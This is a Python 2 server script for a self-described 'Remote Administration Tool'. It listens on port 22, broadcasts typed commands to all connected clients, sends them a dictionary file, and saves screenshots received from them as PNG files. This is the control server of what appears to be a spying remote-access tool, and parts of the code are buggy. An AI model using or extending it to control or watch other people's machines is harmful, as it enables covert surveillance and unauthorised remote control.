#!/usr/bin/python
##
#\file server.py
#
#\brief The server for our Remote Administration Tool
#
#\author Elephant Bomb
#
#\date 2016-04-10
from fileSend import fileSend
from socket import *
import sys
import thread
HOST = ''       
PORT = 22

def sendMessages(clients):
	while True:
		if clients:
			commandClient = raw_input("COMMAND WINDOW: ")
			if commandClient == "SENDFILE":
				fileName = "server_dictionary.txt"
				fileSend(fileName, clients)
			else:
				for i in range(0, len(clients)):
					clients[i].send(commandClient)
	clients.close()

def handleMessages(clients):
	while True:
		for i in range(0, len(clients)):
				clientData = clients[i].recv(1024)
				if clientData:
					if clientData == "RECOVERFILE":
						file = open("client_screen_" + str(i) + ".png",'wb') #open in binary
						line = clients[i].recv(1024)
						while (line):
							file.write(line)
							line = clients[i].recv(1024)
							print line
							if line == "\0":
								print 'Recovered file'
								file.close()
					else:
						print clientData
	clients.close()

if __name__=='__main__':
	#Create a container for clients
	clients = []
	#Create and bind sockets
	socketHolder = socket(AF_INET, SOCK_STREAM)
	socketHolder.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
	socketHolder.bind((HOST, PORT))
	print "Listening on PORT: %s" % str(PORT)
	#Accepting 20 Connections to Queue
	socketHolder.listen(20) 
	while True:
		connection, address = socketHolder.accept()
		print 'Connection from: ', address
		clients.append(connection)
		thread.start_new_thread(sendMessages, (clients,))
		thread.start_new_thread(handleMessages, (clients,))